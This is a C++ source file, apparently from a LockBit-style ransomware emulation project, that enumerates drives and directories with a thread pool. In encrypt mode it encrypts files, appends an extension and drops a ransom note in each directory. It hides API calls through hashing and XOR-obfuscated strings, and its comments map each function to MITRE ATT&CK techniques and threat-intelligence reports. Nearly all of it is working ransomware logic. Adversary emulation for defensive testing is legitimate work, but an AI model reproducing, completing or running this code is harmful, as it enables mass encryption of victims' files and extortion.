#include <filesystem>
#include <mutex>
#include "crypto/xor_obfuscation.hpp"
#include "enumerate.hpp"
#include "impact.hpp"
#include "logger.hpp"
#include "util/os_util.hpp"
#include "util/string_util.hpp"

#ifndef NO_WIN_API_HASHING
    #include "util/winapihelper.hpp"
#endif

namespace enumerate {

void enumerateAndEncryptThreadFunc(ThreadPool<Config, std::wstring, int>* pool, Config& cfg, std::wstring& dir_to_process, int& processing_mode);

bool track_files = false;
std::vector<std::wstring> processed_files;
std::mutex processed_files_mutex;

/*
 * GetLogicalDrives:
 *      About:
 *          Gets the drive strings (e.g. "C:\\", "D:\\") for the available logical drives on the
 *          local system using the GetLogicalDriveStringsW API call.
 *      Result:
 *          Vector of drive strings
 *      MITRE ATT&CK Techniques:
 *          T1083: File and Directory Discovery
 *          T1106: Native API
 *      CTI:
 *          https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/lockbit-green-ransomware-conti-based-encryptor
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit
 */
std::vector<std::wstring> GetLogicalDrives() {
    std::vector<std::wstring> drives;
    wchar_t buffer[256];
    memset(buffer, 0, sizeof(buffer));

#ifndef NO_WIN_API_HASHING
    DWORD error_code;
    FP_GetLogicalDriveStringsW getLogicalDriveStringsW = (FP_GetLogicalDriveStringsW)winapi_helper::GetAPI(0x89478d5b, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (getLogicalDriveStringsW == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for GetLogicalDriveStringsW. Error code"), error_code));
    }
    if (!getLogicalDriveStringsW(sizeof(buffer) - 1, buffer)) {
#else
    if (!GetLogicalDriveStringsW(sizeof(buffer) - 1, buffer)) {
#endif
        XorLogger::LogError(std::format(
            "{}: {}",
            XOR_LIT("GetLogicalDriveStringsW failed to get logical drives. Error code"),
            GetLastError()
        ));
    } else {
        for (LPWSTR curr = buffer; *curr; curr += 4) {
            std::wstring curr_drive(curr);
            drives.push_back(curr_drive);
            XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Found drive"), string_util::wstring_to_string(curr_drive)));
        }
    }
    return drives;
}

/*
 * EnumerateAndEncrypt:
 *      About:
 *          Uses thread pool to search for and encrypt all valid target files and subdirectories starting at 
 *          start_dir. If track_processed_files is set to true, the function will track which files were processed,
 *          and the caller can get a vector to such file paths by calling enumerate::GetProcessedFiles.
 *          Value for processing_mode will determine whether or not the files get encrypted or untouched
 *          (enumerate only).
 *          IF encrypting files, the first 4KB of the file will be encrypted, or the entire file if smaller than 4KB,
 *          using 256-bit AES in CTR mode. Appends IV and AES key to the encrypted file. After encrypting files in the
 *          directory, a ransom note will be dropped with filename <extension.README.txt.
 *          File and directory enumeration is done using FindFirstFileW and FindNextFileW API calls.
 *          File reads and writes are performed using the CreateFileW, ReadFile, and WriteFile API calls.
 *      Result:
 *          Enumerates files and encrypts valid targets, drops ransom note if encrypting files.
 *      MITRE ATT&CK Techniques:
 *          T1486: Data Encrypted for Impact
 *          T1106: Native API
 *          T1083: File and Directory Discovery
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 *          https://redpiranha.net/news/look-lockbit-3-ransomware
 */
void EnumerateAndEncrypt(Config& cfg, std::vector<std::wstring>& start_dirs, bool track_processed_files, int processing_mode) {
    enumerate::track_files = track_processed_files;
    for (const std::wstring& start_dir: start_dirs) {
        if (!std::filesystem::exists(start_dir)) {
            XorLogger::LogError(std::format("{} {}", string_util::wstring_to_string(start_dir), XOR_LIT("does not exist. Cannot enumerate and encrypt.")));
            return;
        } else if (!std::filesystem::is_directory(start_dir)) {
            XorLogger::LogError(std::format("{} {}", string_util::wstring_to_string(start_dir), XOR_LIT("is not a directory. Cannot enumerate and encrypt.")));
            return;
        }
    }

    // Create thread pool for enumeration and encryption
    size_t num_threads = std::thread::hardware_concurrency();
    ThreadPool<Config, std::wstring, int> pool(num_threads, enumerate::enumerateAndEncryptThreadFunc);
    XorLogger::LogDebug(std::format("{} {}", XOR_LIT("Created thread pool of size"), num_threads));
    for (std::wstring& start_dir: start_dirs) {
         XorLogger::LogDebug(std::format(
            "{} {}", 
            XOR_LIT("Queuing directory for processing:"),
            string_util::wstring_to_string(start_dir)
        ));
        pool.QueueJob(cfg, start_dir, processing_mode);
    }
    pool.Start();
    pool.Join();
}

// Get copy of the processed file paths vector
std::vector<std::wstring> GetProcessedFiles() { 
    // critical section
    std::lock_guard lk(enumerate::processed_files_mutex);
    return std::vector<std::wstring>(enumerate::processed_files);
    // end critical section
}

// Empties processed file paths vector
void ClearProcessedFiles() {
    // critical section
    std::lock_guard lk(enumerate::processed_files_mutex);
    enumerate::processed_files.clear();
    // end critical section
}

// Reference: https://learn.microsoft.com/en-us/windows/win32/fileio/listing-the-files-in-a-directory
void enumerateAndEncryptThreadFunc(ThreadPool<Config, std::wstring, int>* pool, Config& cfg, std::wstring& dir_to_process, int& processing_mode) {
    std::wstring search_str = dir_to_process + L"\\*";
    std::vector<std::wstring> files_to_process;
    std::vector<std::wstring> successfully_processed_files;
    WIN32_FIND_DATAW find_file_data;
    std::wstring ext_str = L"." + cfg.GetExtension();

    XorLogger::LogDebug(std::format(
        "Thread {} {} {}", 
        os_util::GetThreadIdStr(), 
        XOR_LIT("is processing directory"),
        string_util::wstring_to_string(dir_to_process)
    ));
    
    // Get valid subdirectories first and queue jobs for thread pool. 
    // Save valid target files to process afterwards
    HANDLE h_find = FindFirstFileW(search_str.c_str(), &find_file_data);
    if (h_find == INVALID_HANDLE_VALUE) {
        XorLogger::LogError(std::format(
            "{} {} with error code {}",
            XOR_LIT("FindFirstFile failed for"),
            string_util::wstring_to_string(dir_to_process), GetLastError()
        ));
        return;
    }
    do {
        std::wstring leaf_name(find_file_data.cFileName);
        std::wstring full_path = dir_to_process + L"\\" + leaf_name;

        // Skip symbolic links
        if ((find_file_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) == FILE_ATTRIBUTE_REPARSE_POINT) {
            XorLogger::LogDebug(std::format(
                "Thread {} {} {}", 
                os_util::GetThreadIdStr(), 
                XOR_LIT("skipping link/reparse point"),
                string_util::wstring_to_string(full_path)
            ));
            continue;
        }

        if ((find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY) {
            // If subdirectory is valid, queue the thread pool job
            if (cfg.IsValidTargetDir(leaf_name)) {
                pool->QueueJob(cfg, full_path, processing_mode);
            }
        } else {
            // If file is valid, process it later. Skip system and readonly files
            if ((find_file_data.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) == FILE_ATTRIBUTE_SYSTEM) {
                XorLogger::LogDebug(std::format(
                    "Thread {} {} {}", 
                    os_util::GetThreadIdStr(), 
                    XOR_LIT("skipping system file"),
                    string_util::wstring_to_string(full_path)
                ));
            } else if ((find_file_data.dwFileAttributes & FILE_ATTRIBUTE_READONLY) == FILE_ATTRIBUTE_READONLY) {
                XorLogger::LogDebug(std::format(
                    "Thread {} {} {}", 
                    os_util::GetThreadIdStr(), 
                    XOR_LIT("skipping readonly file"),
                    string_util::wstring_to_string(full_path)
                ));
            } else if (!cfg.IsValidTargetFile(leaf_name)) {
                XorLogger::LogDebug(std::format(
                    "Thread {} {} {} {}", 
                    os_util::GetThreadIdStr(), 
                    XOR_LIT("skipping file"),
                    string_util::wstring_to_string(full_path),
                    XOR_LIT("due to filename or extension")
                ));
            } else {
                XorLogger::LogDebug(std::format(
                    "Thread {} {} {}", 
                    os_util::GetThreadIdStr(), 
                    XOR_LIT("found valid candidate file"),
                    string_util::wstring_to_string(full_path)
                ));
                files_to_process.push_back(full_path);  
            }
        }
    } while (FindNextFileW(h_find, &find_file_data) != 0);
    DWORD error_code = GetLastError();
    FindClose(h_find);

    // Make sure we finished properly
    if (error_code != ERROR_NO_MORE_FILES) {
        XorLogger::LogError(std::format(
            "{} {} with error code {}",
            XOR_LIT("FindNextFile failed for"),
            string_util::wstring_to_string(dir_to_process),
            GetLastError()
        ));
    }

    // Process target files
    for (const std::wstring& f: files_to_process) {
        if (processing_mode == LB_ENUMERATE_ONLY) {
            successfully_processed_files.push_back(f);
            XorLogger::LogDebug(std::format(
                "Thread {} {} {}", 
                os_util::GetThreadIdStr(), 
                XOR_LIT("successfully enumerated file"),
                string_util::wstring_to_string(f)
            ));
        } else if (processing_mode == LB_ENCRYPT_FILES && impact::EncryptFileAndAppendExtension(f, cfg.GetExtension(), cfg.GetRsaPublicSessionKey())) {
            successfully_processed_files.push_back(f);
            XorLogger::LogDebug(std::format(
                "Thread {} {} {}", 
                os_util::GetThreadIdStr(), 
                XOR_LIT("successfully encrypted file"),
                string_util::wstring_to_string(f)
            ));
        } else {
            XorLogger::LogError(std::format(
                "Thread {} {} {}", 
                os_util::GetThreadIdStr(), 
                XOR_LIT("failed to process file"),
                string_util::wstring_to_string(f)
            ));
        } 
    }

    // Drop ransom note to directory if encrypting
    if (processing_mode == LB_ENCRYPT_FILES) {
        impact::DropRansomNote(cfg, dir_to_process);
    }

    // store processed file information if desired
    if (enumerate::track_files) { // critical section
        std::lock_guard lk(enumerate::processed_files_mutex);
        for (const std::wstring& f: successfully_processed_files) {     
            enumerate::processed_files.push_back(f);
        }
    } // end critical section
}

} // namespace